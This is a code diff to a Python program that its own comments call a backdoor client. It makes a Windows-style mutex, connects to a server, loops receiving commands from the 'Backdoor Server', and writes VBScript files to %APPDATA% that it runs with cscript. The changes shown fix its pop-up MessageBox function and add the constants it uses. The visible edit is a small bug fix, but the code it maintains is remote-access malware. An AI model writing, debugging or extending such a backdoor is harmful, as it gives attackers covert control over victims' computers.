@@ -38,6 +38,11 @@ TMP = environ['APPDATA']
 
 intBuffer = 1024
 
+# Define VBScript Object's Numbers to use in the MessageBox
+vbOkOnly = "0"
+vbInformation = "64"
+vbSystemModal = "4096"
+
 # Step 3: Define and Create Mutex Object
 mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
 
@@ -109,7 +114,8 @@ server_connect()
 def MessageBox(message):
     objVBS = open(TMP + "/m.vbs", "w")
 
-    objVBS.write("MsgBox " + message + " " + vbOkOnly + vbInformation + vbSystemModal, "Message")   # noqa
+    # objVBS.write("MsgBox " + message + " " + vbOkOnly + vbInformation + vbSystemModal, "Message")   # noqa
+    objVBS.write(f'MsgBox "{message}", {vbOkOnly} + {vbInformation} + {vbSystemModal}, "Message"')
     objVBS.close()
 
     subprocess.Popen(['cscript', TMP + "/m.vbs"], shell=True)
@@ -118,7 +124,6 @@ def MessageBox(message):
 while True:
     try:
         while True:
-
             # Receive Data(Command) from the Backdoor Server and Decode it
             strData = recv(intBuffer)
             strData = decode_utf8(strData)
